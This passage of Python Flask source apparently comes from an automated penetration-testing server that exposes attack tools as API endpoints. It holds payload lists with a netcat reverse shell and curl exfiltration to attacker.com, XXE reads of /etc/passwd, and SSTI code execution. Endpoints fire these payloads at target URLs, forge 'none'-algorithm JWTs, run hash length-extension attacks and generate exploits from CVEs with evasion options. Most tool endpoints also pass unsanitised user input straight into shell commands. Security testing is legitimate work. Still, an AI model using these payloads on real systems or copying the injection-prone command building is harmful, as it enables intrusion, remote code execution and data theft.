                    "/etc/passwd%00"
                ]
            },
            "cmd_injection": {
                "basic": ["; whoami", "| whoami", "& whoami", "`whoami`"],
                "advanced": [
                    "; cat /etc/passwd",
                    "| nc -e /bin/bash attacker.com 4444",
                    "&& curl http://attacker.com/$(whoami)",
                    "`curl http://attacker.com/$(id)`"
                ]
            },
            "xxe": {
                "basic": [
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
                    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/\">]><foo>&xxe;</foo>"
                ]
            },
            "ssti": {
                "basic": ["{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>"],
                "advanced": [
                    "{{config}}",
                    "{{''.__class__.__mro__[2].__subclasses__()}}",
                    "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}"
                ]
            }
        }

    def generate_contextual_payload(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate contextual payloads based on target information"""

        attack_type = target_info.get("attack_type", "xss")
        complexity = target_info.get("complexity", "basic")
        target_tech = target_info.get("technology", "").lower()

        # Get base payloads
        payloads = self._get_payloads(attack_type, complexity)

        # Enhance payloads with context
        enhanced_payloads = self._enhance_with_context(payloads, target_tech)

        # Generate test cases
        test_cases = self._generate_test_cases(enhanced_payloads, attack_type)

        return {
            "attack_type": attack_type,
            "complexity": complexity,
            "payload_count": len(enhanced_payloads),
            "payloads": enhanced_payloads,
            "test_cases": test_cases,
            "recommendations": self._get_recommendations(attack_type)
        }

    def _get_payloads(self, attack_type: str, complexity: str) -> list:
        """Get payloads for specific attack type and complexity"""
        if attack_type in self.payload_templates:
            if complexity in self.payload_templates[attack_type]:
                return self.payload_templates[attack_type][complexity]
            else:
                # Return basic payloads if complexity not found
                return self.payload_templates[attack_type].get("basic", [])

        return ["<!-- No payloads available for this attack type -->"]

    def _enhance_with_context(self, payloads: list, tech_context: str) -> list:
        """Enhance payloads with contextual information"""
        enhanced = []

        for payload in payloads:
            # Basic payload
            enhanced.append({
                "payload": payload,
                "context": "basic",
                "encoding": "none",
                "risk_level": self._assess_risk_level(payload)
            })

            # URL encoded version
            url_encoded = payload.replace(" ", "%20").replace("<", "%3C").replace(">", "%3E")
            enhanced.append({
                "payload": url_encoded,
                "context": "url_encoded",
                "encoding": "url",
                "risk_level": self._assess_risk_level(payload)
            })

        return enhanced

    def _generate_test_cases(self, payloads: list, attack_type: str) -> list:
        """Generate test cases for the payloads"""
        test_cases = []

        for i, payload_info in enumerate(payloads[:5]):  # Limit to 5 test cases
            test_case = {
                "id": f"test_{i+1}",
                "payload": payload_info["payload"],
                "method": "GET" if len(payload_info["payload"]) < 100 else "POST",
                "expected_behavior": self._get_expected_behavior(attack_type),
                "risk_level": payload_info["risk_level"]
            }
            test_cases.append(test_case)

        return test_cases

    def _get_expected_behavior(self, attack_type: str) -> str:
        """Get expected behavior for attack type"""
        behaviors = {
            "xss": "JavaScript execution or popup alert",
            "sqli": "Database error or data extraction",
            "lfi": "File content disclosure",
            "cmd_injection": "Command execution on server",
            "ssti": "Template expression evaluation",
            "xxe": "XML external entity processing"
        }
        return behaviors.get(attack_type, "Unexpected application behavior")

    def _assess_risk_level(self, payload: str) -> str:
        """Assess risk level of payload"""
        high_risk_indicators = ["system", "exec", "eval", "cmd", "shell", "passwd", "etc"]
        medium_risk_indicators = ["script", "alert", "union", "select"]

        payload_lower = payload.lower()

        if any(indicator in payload_lower for indicator in high_risk_indicators):
            return "HIGH"
        elif any(indicator in payload_lower for indicator in medium_risk_indicators):
            return "MEDIUM"
        else:
            return "LOW"

    def _get_recommendations(self, attack_type: str) -> list:
        """Get testing recommendations"""
        recommendations = {
            "xss": [
                "Test in different input fields and parameters",
                "Try both reflected and stored XSS scenarios",
                "Test with different browsers for compatibility"
            ],
            "sqli": [
                "Test different SQL injection techniques",
                "Try both error-based and blind injection",
                "Test various database-specific payloads"
            ],
            "lfi": [
                "Test various directory traversal depths",
                "Try different encoding techniques",
                "Test for log file inclusion"
            ],
            "cmd_injection": [
                "Test different command separators",
                "Try both direct and blind injection",
                "Test with various payloads for different OS"
            ]
        }

        return recommendations.get(attack_type, ["Test thoroughly", "Monitor responses"])

# Global AI payload generator
ai_payload_generator = AIPayloadGenerator()

@app.route("/api/ai/generate_payload", methods=["POST"])
def ai_generate_payload():
    """Generate AI-powered contextual payloads for security testing"""
    try:
        params = request.json
        target_info = {
            "attack_type": params.get("attack_type", "xss"),
            "complexity": params.get("complexity", "basic"),
            "technology": params.get("technology", ""),
            "url": params.get("url", "")
        }

        logger.info(f"🤖 Generating AI payloads for {target_info['attack_type']} attack")
        result = ai_payload_generator.generate_contextual_payload(target_info)

        logger.info(f"✅ Generated {result['payload_count']} contextual payloads")

        return jsonify({
            "success": True,
            "ai_payload_generation": result,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in AI payload generation: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/ai/test_payload", methods=["POST"])
def ai_test_payload():
    """Test generated payload against target with AI analysis"""
    try:
        params = request.json
        payload = params.get("payload", "")
        target_url = params.get("target_url", "")
        method = params.get("method", "GET")

        if not payload or not target_url:
            return jsonify({
                "success": False,
                "error": "Payload and target_url are required"
            }), 400

        logger.info(f"🧪 Testing AI-generated payload against {target_url}")

        # Create test command based on method and payload
        if method.upper() == "GET":
            encoded_payload = payload.replace(" ", "%20").replace("'", "%27")
            test_command = f"curl -s '{target_url}?test={encoded_payload}'"
        else:
            test_command = f"curl -s -X POST -d 'test={payload}' '{target_url}'"

        # Execute test
        result = execute_command(test_command, use_cache=False)

        # AI analysis of results
        analysis = {
            "payload_tested": payload,
            "target_url": target_url,
            "method": method,
            "response_size": len(result.get("stdout", "")),
            "success": result.get("success", False),
            "potential_vulnerability": payload.lower() in result.get("stdout", "").lower(),
            "recommendations": [
                "Analyze response for payload reflection",
                "Check for error messages indicating vulnerability",
                "Monitor application behavior changes"
            ]
        }

        logger.info(f"🔍 Payload test completed | Potential vuln: {analysis['potential_vulnerability']}")

        return jsonify({
            "success": True,
            "test_result": result,
            "ai_analysis": analysis,
            "timestamp": datetime.now().isoformat()
        })

    except Exception as e:
        logger.error(f"💥 Error in AI payload testing: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ADVANCED API TESTING TOOLS (v5.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/tools/api_fuzzer", methods=["POST"])
def api_fuzzer():
    """Advanced API endpoint fuzzing with intelligent parameter discovery"""
    try:
        params = request.json
        base_url = params.get("base_url", "")
        endpoints = params.get("endpoints", [])
        methods = params.get("methods", ["GET", "POST", "PUT", "DELETE"])
        wordlist = params.get("wordlist", "/usr/share/wordlists/api/api-endpoints.txt")

        if not base_url:
            logger.warning("🌐 API Fuzzer called without base_url parameter")
            return jsonify({
                "error": "Base URL parameter is required"
            }), 400

        # Create comprehensive API fuzzing command
        if endpoints:
            # Test specific endpoints
            results = []
            for endpoint in endpoints:
                for method in methods:
                    test_url = f"{base_url.rstrip('/')}/{endpoint.lstrip('/')}"
                    command = f"curl -s -X {method} -w '%{{http_code}}|%{{size_download}}' '{test_url}'"
                    result = execute_command(command, use_cache=False)
                    results.append({
                        "endpoint": endpoint,
                        "method": method,
                        "result": result
                    })

            logger.info(f"🔍 API endpoint testing completed for {len(endpoints)} endpoints")
            return jsonify({
                "success": True,
                "fuzzing_type": "endpoint_testing",
                "results": results
            })
        else:
            # Discover endpoints using wordlist
            command = f"ffuf -u {base_url}/FUZZ -w {wordlist} -mc 200,201,202,204,301,302,307,401,403,405 -t 50"

            logger.info(f"🔍 Starting API endpoint discovery: {base_url}")
            result = execute_command(command)
            logger.info(f"📊 API endpoint discovery completed")

            return jsonify({
                "success": True,
                "fuzzing_type": "endpoint_discovery",
                "result": result
            })

    except Exception as e:
        logger.error(f"💥 Error in API fuzzer: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/graphql_scanner", methods=["POST"])
def graphql_scanner():
    """Advanced GraphQL security scanning and introspection"""
    try:
        params = request.json
        endpoint = params.get("endpoint", "")
        introspection = params.get("introspection", True)
        query_depth = params.get("query_depth", 10)
        mutations = params.get("test_mutations", True)

        if not endpoint:
            logger.warning("🌐 GraphQL Scanner called without endpoint parameter")
            return jsonify({
                "error": "GraphQL endpoint parameter is required"
            }), 400

        logger.info(f"🔍 Starting GraphQL security scan: {endpoint}")

        results = {
            "endpoint": endpoint,
            "tests_performed": [],
            "vulnerabilities": [],
            "recommendations": []
        }

        # Test 1: Introspection query
        if introspection:
            introspection_query = '''
            {
                __schema {
                    types {
                        name
                        fields {
                            name
                            type {
                                name
                            }
                        }
                    }
                }
            }
            '''

            clean_query = introspection_query.replace('\n', ' ').replace('  ', ' ').strip()
            command = f"curl -s -X POST -H 'Content-Type: application/json' -d '{{\"query\":\"{clean_query}\"}}' '{endpoint}'"
            result = execute_command(command, use_cache=False)

            results["tests_performed"].append("introspection_query")

            if "data" in result.get("stdout", ""):
                results["vulnerabilities"].append({
                    "type": "introspection_enabled",
                    "severity": "MEDIUM",
                    "description": "GraphQL introspection is enabled"
                })

        # Test 2: Query depth analysis
        deep_query = "{ " * query_depth + "field" + " }" * query_depth
        command = f"curl -s -X POST -H 'Content-Type: application/json' -d '{{\"query\":\"{deep_query}\"}}' {endpoint}"
        depth_result = execute_command(command, use_cache=False)

        results["tests_performed"].append("query_depth_analysis")

        if "error" not in depth_result.get("stdout", "").lower():
            results["vulnerabilities"].append({
                "type": "no_query_depth_limit",
                "severity": "HIGH",
                "description": f"No query depth limiting detected (tested depth: {query_depth})"
            })

        # Test 3: Batch query testing
        batch_query = '[' + ','.join(['{\"query\":\"{field}\"}' for _ in range(10)]) + ']'
        command = f"curl -s -X POST -H 'Content-Type: application/json' -d '{batch_query}' {endpoint}"
        batch_result = execute_command(command, use_cache=False)

        results["tests_performed"].append("batch_query_testing")

        if "data" in batch_result.get("stdout", "") and batch_result.get("success"):
            results["vulnerabilities"].append({
                "type": "batch_queries_allowed",
                "severity": "MEDIUM",
                "description": "Batch queries are allowed without rate limiting"
            })

        # Generate recommendations
        if results["vulnerabilities"]:
            results["recommendations"] = [
                "Disable introspection in production",
                "Implement query depth limiting",
                "Add rate limiting for batch queries",
                "Implement query complexity analysis",
                "Add authentication for sensitive operations"
            ]

        logger.info(f"📊 GraphQL scan completed | Vulnerabilities found: {len(results['vulnerabilities'])}")

        return jsonify({
            "success": True,
            "graphql_scan_results": results
        })

    except Exception as e:
        logger.error(f"💥 Error in GraphQL scanner: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/jwt_analyzer", methods=["POST"])
def jwt_analyzer():
    """Advanced JWT token analysis and vulnerability testing"""
    try:
        params = request.json
        jwt_token = params.get("jwt_token", "")
        target_url = params.get("target_url", "")

        if not jwt_token:
            logger.warning("🔐 JWT Analyzer called without jwt_token parameter")
            return jsonify({
                "error": "JWT token parameter is required"
            }), 400

        logger.info(f"🔍 Starting JWT security analysis")

        results = {
            "token": jwt_token[:50] + "..." if len(jwt_token) > 50 else jwt_token,
            "vulnerabilities": [],
            "token_info": {},
            "attack_vectors": []
        }

        # Decode JWT header and payload (basic analysis)
        try:
            parts = jwt_token.split('.')
            if len(parts) >= 2:
                # Decode header

                # Add padding if needed
                header_b64 = parts[0] + '=' * (4 - len(parts[0]) % 4)
                payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)

                try:
                    header = json.loads(base64.b64decode(header_b64))
                    payload = json.loads(base64.b64decode(payload_b64))

                    results["token_info"] = {
                        "header": header,
                        "payload": payload,
                        "algorithm": header.get("alg", "unknown")
                    }

                    # Check for vulnerabilities
                    algorithm = header.get("alg", "").lower()

                    if algorithm == "none":
                        results["vulnerabilities"].append({
                            "type": "none_algorithm",
                            "severity": "CRITICAL",
                            "description": "JWT uses 'none' algorithm - no signature verification"
                        })

                    if algorithm in ["hs256", "hs384", "hs512"]:
                        results["attack_vectors"].append("hmac_key_confusion")
                        results["vulnerabilities"].append({
                            "type": "hmac_algorithm",
                            "severity": "MEDIUM",
                            "description": "HMAC algorithm detected - vulnerable to key confusion attacks"
                        })

                    # Check token expiration
                    exp = payload.get("exp")
                    if not exp:
                        results["vulnerabilities"].append({
                            "type": "no_expiration",
                            "severity": "HIGH",
                            "description": "JWT token has no expiration time"
                        })

                except Exception as decode_error:
                    results["vulnerabilities"].append({
                        "type": "malformed_token",
                        "severity": "HIGH",
                        "description": f"Token decoding failed: {str(decode_error)}"
                    })

        except Exception as e:
            results["vulnerabilities"].append({
                "type": "invalid_format",
                "severity": "HIGH",
                "description": "Invalid JWT token format"
            })

        # Test token manipulation if target URL provided
        if target_url:
            # Test none algorithm attack
            none_token_parts = jwt_token.split('.')
            if len(none_token_parts) >= 2:
                # Create none algorithm token
                none_header = base64.b64encode('{"alg":"none","typ":"JWT"}'.encode()).decode().rstrip('=')
                none_token = f"{none_header}.{none_token_parts[1]}."

                command = f"curl -s -H 'Authorization: Bearer {none_token}' '{target_url}'"
                none_result = execute_command(command, use_cache=False)

                if "200" in none_result.get("stdout", "") or "success" in none_result.get("stdout", "").lower():
                    results["vulnerabilities"].append({
                        "type": "none_algorithm_accepted",
                        "severity": "CRITICAL",
                        "description": "Server accepts tokens with 'none' algorithm"
                    })

        logger.info(f"📊 JWT analysis completed | Vulnerabilities found: {len(results['vulnerabilities'])}")

        return jsonify({
            "success": True,
            "jwt_analysis_results": results
        })

    except Exception as e:
        logger.error(f"💥 Error in JWT analyzer: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/api_schema_analyzer", methods=["POST"])
def api_schema_analyzer():
    """Analyze API schemas and identify potential security issues"""
    try:
        params = request.json
        schema_url = params.get("schema_url", "")
        schema_type = params.get("schema_type", "openapi")  # openapi, swagger, graphql

        if not schema_url:
            logger.warning("📋 API Schema Analyzer called without schema_url parameter")
            return jsonify({
                "error": "Schema URL parameter is required"
            }), 400

        logger.info(f"🔍 Starting API schema analysis: {schema_url}")

        # Fetch schema
        command = f"curl -s '{schema_url}'"
        result = execute_command(command, use_cache=True)

        if not result.get("success"):
            return jsonify({
                "error": "Failed to fetch API schema"
            }), 400

        schema_content = result.get("stdout", "")

        analysis_results = {
            "schema_url": schema_url,
            "schema_type": schema_type,
            "endpoints_found": [],
            "security_issues": [],
            "recommendations": []
        }

        # Parse schema based on type
        try:
            schema_data = json.loads(schema_content)
            if schema_type.lower() in ["openapi", "swagger"]:
                # OpenAPI/Swagger analysis
                paths = schema_data.get("paths", {})

                for path, methods in paths.items():
                    for method, details in methods.items():
                        if isinstance(details, dict):
                            endpoint_info = {
                                "path": path,
                                "method": method.upper(),
                                "summary": details.get("summary", ""),
                                "parameters": details.get("parameters", []),
                                "security": details.get("security", [])
                            }
                            analysis_results["endpoints_found"].append(endpoint_info)

                            # Check for security issues
                            if not endpoint_info["security"]:
                                analysis_results["security_issues"].append({
                                    "endpoint": f"{method.upper()} {path}",
                                    "issue": "no_authentication",
                                    "severity": "MEDIUM",
                                    "description": "Endpoint has no authentication requirements"
                                })

                            # Check for sensitive data in parameters
                            for param in endpoint_info["parameters"]:
                                param_name = param.get("name", "").lower()
                                if any(sensitive in param_name for sensitive in ["password", "token", "key", "secret"]):
                                    analysis_results["security_issues"].append({
                                        "endpoint": f"{method.upper()} {path}",
                                        "issue": "sensitive_parameter",
                                        "severity": "HIGH",
                                        "description": f"Sensitive parameter detected: {param_name}"
                                    })

            # Generate recommendations
            if analysis_results["security_issues"]:
                analysis_results["recommendations"] = [
                    "Implement authentication for all endpoints",
                    "Use HTTPS for all API communications",
                    "Validate and sanitize all input parameters",
                    "Implement rate limiting",
                    "Add proper error handling",
                    "Use secure headers (CORS, CSP, etc.)"
                ]

        except json.JSONDecodeError:
            analysis_results["security_issues"].append({
                "endpoint": "schema",
                "issue": "invalid_json",
                "severity": "HIGH",
                "description": "Schema is not valid JSON"
            })

        logger.info(f"📊 Schema analysis completed | Issues found: {len(analysis_results['security_issues'])}")

        return jsonify({
            "success": True,
            "schema_analysis_results": analysis_results
        })

    except Exception as e:
        logger.error(f"💥 Error in API schema analyzer: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ADVANCED CTF TOOLS (v5.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/tools/volatility3", methods=["POST"])
def volatility3():
    """Execute Volatility3 for advanced memory forensics with enhanced logging"""
    try:
        params = request.json
        memory_file = params.get("memory_file", "")
        plugin = params.get("plugin", "")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")

        if not memory_file:
            logger.warning("🧠 Volatility3 called without memory_file parameter")
            return jsonify({
                "error": "Memory file parameter is required"
            }), 400

        if not plugin:
            logger.warning("🧠 Volatility3 called without plugin parameter")
            return jsonify({
                "error": "Plugin parameter is required"
            }), 400

        command = f"vol -f {memory_file} {plugin}"

        if output_file:
            command += f" -o {output_file}"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🧠 Starting Volatility3 analysis: {plugin}")
        result = execute_command(command)
        logger.info(f"📊 Volatility3 analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in volatility3 endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/foremost", methods=["POST"])
def foremost():
    """Execute Foremost for file carving with enhanced logging"""
    try:
        params = request.json
        input_file = params.get("input_file", "")
        output_dir = params.get("output_dir", "/tmp/foremost_output")
        file_types = params.get("file_types", "")
        additional_args = params.get("additional_args", "")

        if not input_file:
            logger.warning("📁 Foremost called without input_file parameter")
            return jsonify({
                "error": "Input file parameter is required"
            }), 400

        # Ensure output directory exists
        Path(output_dir).mkdir(parents=True, exist_ok=True)

        command = f"foremost -o {output_dir}"

        if file_types:
            command += f" -t {file_types}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {input_file}"

        logger.info(f"📁 Starting Foremost file carving: {input_file}")
        result = execute_command(command)
        result["output_directory"] = output_dir
        logger.info(f"📊 Foremost carving completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in foremost endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/steghide", methods=["POST"])
def steghide():
    """Execute Steghide for steganography analysis with enhanced logging"""
    try:
        params = request.json
        action = params.get("action", "extract")  # extract, embed, info
        cover_file = params.get("cover_file", "")
        embed_file = params.get("embed_file", "")
        passphrase = params.get("passphrase", "")
        output_file = params.get("output_file", "")
        additional_args = params.get("additional_args", "")

        if not cover_file:
            logger.warning("🖼️ Steghide called without cover_file parameter")
            return jsonify({
                "error": "Cover file parameter is required"
            }), 400

        if action == "extract":
            command = f"steghide extract -sf {cover_file}"
            if output_file:
                command += f" -xf {output_file}"
        elif action == "embed":
            if not embed_file:
                return jsonify({"error": "Embed file required for embed action"}), 400
            command = f"steghide embed -cf {cover_file} -ef {embed_file}"
        elif action == "info":
            command = f"steghide info {cover_file}"
        else:
            return jsonify({"error": "Invalid action. Use: extract, embed, info"}), 400

        if passphrase:
            command += f" -p {passphrase}"
        else:
            command += " -p ''"  # Empty passphrase

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🖼️ Starting Steghide {action}: {cover_file}")
        result = execute_command(command)
        logger.info(f"📊 Steghide {action} completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in steghide endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/exiftool", methods=["POST"])
def exiftool():
    """Execute ExifTool for metadata extraction with enhanced logging"""
    try:
        params = request.json
        file_path = params.get("file_path", "")
        output_format = params.get("output_format", "")  # json, xml, csv
        tags = params.get("tags", "")
        additional_args = params.get("additional_args", "")

        if not file_path:
            logger.warning("📷 ExifTool called without file_path parameter")
            return jsonify({
                "error": "File path parameter is required"
            }), 400

        command = f"exiftool"

        if output_format:
            command += f" -{output_format}"

        if tags:
            command += f" -{tags}"

        if additional_args:
            command += f" {additional_args}"

        command += f" {file_path}"

        logger.info(f"📷 Starting ExifTool analysis: {file_path}")
        result = execute_command(command)
        logger.info(f"📊 ExifTool analysis completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in exiftool endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/tools/hashpump", methods=["POST"])
def hashpump():
    """Execute HashPump for hash length extension attacks with enhanced logging"""
    try:
        params = request.json
        signature = params.get("signature", "")
        data = params.get("data", "")
        key_length = params.get("key_length", "")
        append_data = params.get("append_data", "")
        additional_args = params.get("additional_args", "")

        if not all([signature, data, key_length, append_data]):
            logger.warning("🔐 HashPump called without required parameters")
            return jsonify({
                "error": "Signature, data, key_length, and append_data parameters are required"
            }), 400

        command = f"hashpump -s {signature} -d '{data}' -k {key_length} -a '{append_data}'"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🔐 Starting HashPump attack")
        result = execute_command(command)
        logger.info(f"📊 HashPump attack completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in hashpump endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# BUG BOUNTY RECONNAISSANCE TOOLS (v5.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/tools/hakrawler", methods=["POST"])
def hakrawler():
    """
    Execute Hakrawler for web endpoint discovery with enhanced logging

    Note: This implementation uses the standard Kali Linux hakrawler (hakluke/hakrawler)
    command line arguments, NOT the Elsfa7-110 fork. The standard version uses:
    - echo URL | hakrawler (stdin input)
    - -d for depth (not -depth)
    - -s for showing sources (not -forms)
    - -u for unique URLs
    - -subs for subdomain inclusion
    """
    try:
        params = request.json
        url = params.get("url", "")
        depth = params.get("depth", 2)
        forms = params.get("forms", True)
        robots = params.get("robots", True)
        sitemap = params.get("sitemap", True)
        wayback = params.get("wayback", False)
        additional_args = params.get("additional_args", "")

        if not url:
            logger.warning("🕷️ Hakrawler called without URL parameter")
            return jsonify({
                "error": "URL parameter is required"
            }), 400

        # Build command for standard Kali Linux hakrawler (hakluke version)
        command = f"echo '{url}' | hakrawler -d {depth}"

        if forms:
            command += " -s"  # Show sources (includes forms)
        if robots or sitemap or wayback:
            command += " -subs"  # Include subdomains for better coverage

        # Add unique URLs flag for cleaner output
        command += " -u"

        if additional_args:
            command += f" {additional_args}"

        logger.info(f"🕷️ Starting Hakrawler crawling: {url}")
        result = execute_command(command)
        logger.info(f"📊 Hakrawler crawling completed")
        return jsonify(result)
    except Exception as e:
        logger.error(f"💥 Error in hakrawler endpoint: {str(e)}")
        return jsonify({
            "error": f"Server error: {str(e)}"
        }), 500

# ============================================================================
# ADVANCED VULNERABILITY INTELLIGENCE API ENDPOINTS (v6.0 ENHANCEMENT)
# ============================================================================

@app.route("/api/vuln-intel/cve-monitor", methods=["POST"])
def cve_monitor():
    """Monitor CVE databases for new vulnerabilities with AI analysis"""
    try:
        params = request.json
        hours = params.get("hours", 24)
        severity_filter = params.get("severity_filter", "HIGH,CRITICAL")
        keywords = params.get("keywords", "")

        logger.info(f"🔍 Monitoring CVE feeds for last {hours} hours with severity filter: {severity_filter}")

        # Fetch latest CVEs
        cve_results = cve_intelligence.fetch_latest_cves(hours, severity_filter)

        # Filter by keywords if provided
        if keywords and cve_results.get("success"):
            keyword_list = [k.strip().lower() for k in keywords.split(",")]
            filtered_cves = []

            for cve in cve_results.get("cves", []):
                description = cve.get("description", "").lower()
                if any(keyword in description for keyword in keyword_list):
                    filtered_cves.append(cve)

            cve_results["cves"] = filtered_cves
            cve_results["filtered_by_keywords"] = keywords
            cve_results["total_after_filter"] = len(filtered_cves)

        # Analyze exploitability for top CVEs
        exploitability_analysis = []
        for cve in cve_results.get("cves", [])[:5]:  # Analyze top 5 CVEs
            cve_id = cve.get("cve_id", "")
            if cve_id:
                analysis = cve_intelligence.analyze_cve_exploitability(cve_id)
                if analysis.get("success"):
                    exploitability_analysis.append(analysis)

        result = {
            "success": True,
            "cve_monitoring": cve_results,
            "exploitability_analysis": exploitability_analysis,
            "timestamp": datetime.now().isoformat()
        }

        logger.info(f"📊 CVE monitoring completed | Found: {len(cve_results.get('cves', []))} CVEs")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in CVE monitoring: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/vuln-intel/exploit-generate", methods=["POST"])
def exploit_generate():
    """Generate exploits from vulnerability data using AI"""
    try:
        params = request.json
        cve_id = params.get("cve_id", "")
        target_os = params.get("target_os", "")
        target_arch = params.get("target_arch", "x64")
        exploit_type = params.get("exploit_type", "poc")
        evasion_level = params.get("evasion_level", "none")

        # Additional target context
        target_info = {
            "target_os": target_os,
            "target_arch": target_arch,
            "exploit_type": exploit_type,
            "evasion_level": evasion_level,
            "target_ip": params.get("target_ip", "192.168.1.100"),
            "target_port": params.get("target_port", 80),
            "description": params.get("target_description", f"Target for {cve_id}")
        }

        if not cve_id:
            logger.warning("🤖 Exploit generation called without CVE ID")
            return jsonify({
                "success": False,
                "error": "CVE ID parameter is required"
            }), 400

        logger.info(f"🤖 Generating exploit for {cve_id} | Target: {target_os} {target_arch}")

        # First analyze the CVE for context
        cve_analysis = cve_intelligence.analyze_cve_exploitability(cve_id)

        if not cve_analysis.get("success"):
            return jsonify({
                "success": False,
                "error": f"Failed to analyze CVE {cve_id}: {cve_analysis.get('error', 'Unknown error')}"
            }), 400

        # Prepare CVE data for exploit generation
        cve_data = {
            "cve_id": cve_id,
            "description": f"Vulnerability analysis for {cve_id}",
            "exploitability_level": cve_analysis.get("exploitability_level", "UNKNOWN"),
            "exploitability_score": cve_analysis.get("exploitability_score", 0)
        }

        # Generate exploit
        exploit_result = exploit_generator.generate_exploit_from_cve(cve_data, target_info)

        # Search for existing exploits for reference
        existing_exploits = cve_intelligence.search_existing_exploits(cve_id)

        result = {
            "success": True,
            "cve_analysis": cve_analysis,
            "exploit_generation": exploit_result,
            "existing_exploits": existing_exploits,
            "target_info": target_info,
            "timestamp": datetime.now().isoformat()
        }

        logger.info(f"🎯 Exploit generation completed for {cve_id}")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in exploit generation: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/vuln-intel/attack-chains", methods=["POST"])
def discover_attack_chains():
    """Discover multi-stage attack possibilities"""
    try:
        params = request.json
        target_software = params.get("target_software", "")
        attack_depth = params.get("attack_depth", 3)
        include_zero_days = params.get("include_zero_days", False)

        if not target_software:
            logger.warning("🔗 Attack chain discovery called without target software")
            return jsonify({
                "success": False,
                "error": "Target software parameter is required"
            }), 400

        logger.info(f"🔗 Discovering attack chains for {target_software} | Depth: {attack_depth}")

        # Discover attack chains
        chain_results = vulnerability_correlator.find_attack_chains(target_software, attack_depth)

        # Enhance with exploit generation for viable chains
        if chain_results.get("success") and chain_results.get("attack_chains"):
            enhanced_chains = []

            for chain in chain_results["attack_chains"][:2]:  # Enhance top 2 chains
                enhanced_chain = chain.copy()
                enhanced_stages = []

                for stage in chain["stages"]:
                    enhanced_stage = stage.copy()

                    # Try to generate exploit for this stage
                    vuln = stage.get("vulnerability", {})
                    cve_id = vuln.get("cve_id", "")

                    if cve_id:
                        try:
                            cve_data = {"cve_id": cve_id, "description": vuln.get("description", "")}
                            target_info = {"target_os": "linux", "target_arch": "x64", "evasion_level": "basic"}

                            exploit_result = exploit_generator.generate_exploit_from_cve(cve_data, target_info)
                            enhanced_stage["exploit_available"] = exploit_result.get("success", False)

                            if exploit_result.get("success"):
                                enhanced_stage["exploit_code"] = exploit_result.get("exploit_code", "")[:500] + "..."
                        except:
                            enhanced_stage["exploit_available"] = False

                    enhanced_stages.append(enhanced_stage)

                enhanced_chain["stages"] = enhanced_stages
                enhanced_chains.append(enhanced_chain)

            chain_results["enhanced_chains"] = enhanced_chains

        result = {
            "success": True,
            "attack_chain_discovery": chain_results,
            "parameters": {
                "target_software": target_software,
                "attack_depth": attack_depth,
                "include_zero_days": include_zero_days
            },
            "timestamp": datetime.now().isoformat()
        }

        logger.info(f"🎯 Attack chain discovery completed | Found: {len(chain_results.get('attack_chains', []))} chains")
        return jsonify(result)

    except Exception as e:
        logger.error(f"💥 Error in attack chain discovery: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/vuln-intel/threat-feeds", methods=["POST"])
def threat_intelligence_feeds():
    """Aggregate and correlate threat intelligence from multiple sources"""
    try:
        params = request.json
        indicators = params.get("indicators", [])
        timeframe = params.get("timeframe", "30d")
        sources = params.get("sources", "all")

        if isinstance(indicators, str):
            indicators = [i.strip() for i in indicators.split(",")]

        if not indicators:
            logger.warning("🧠 Threat intelligence called without indicators")
            return jsonify({
                "success": False,
                "error": "Indicators parameter is required"
            }), 400

        logger.info(f"🧠 Correlating threat intelligence for {len(indicators)} indicators")

        correlation_results = {
            "indicators_analyzed": indicators,
            "timeframe": timeframe,
            "sources": sources,
            "correlations": [],
            "threat_score": 0,
            "recommendations": []
        }

        # Analyze each indicator
        cve_indicators = [i for i in indicators if i.startswith("CVE-")]
        ip_indicators = [i for i in indicators if i.replace(".", "").isdigit()]
        hash_indicators = [i for i in indicators if len(i) in [32, 40, 64] and all(c in "0123456789abcdef" for c in i.lower())]

        # Process CVE indicators
        for cve_id in cve_indicators:
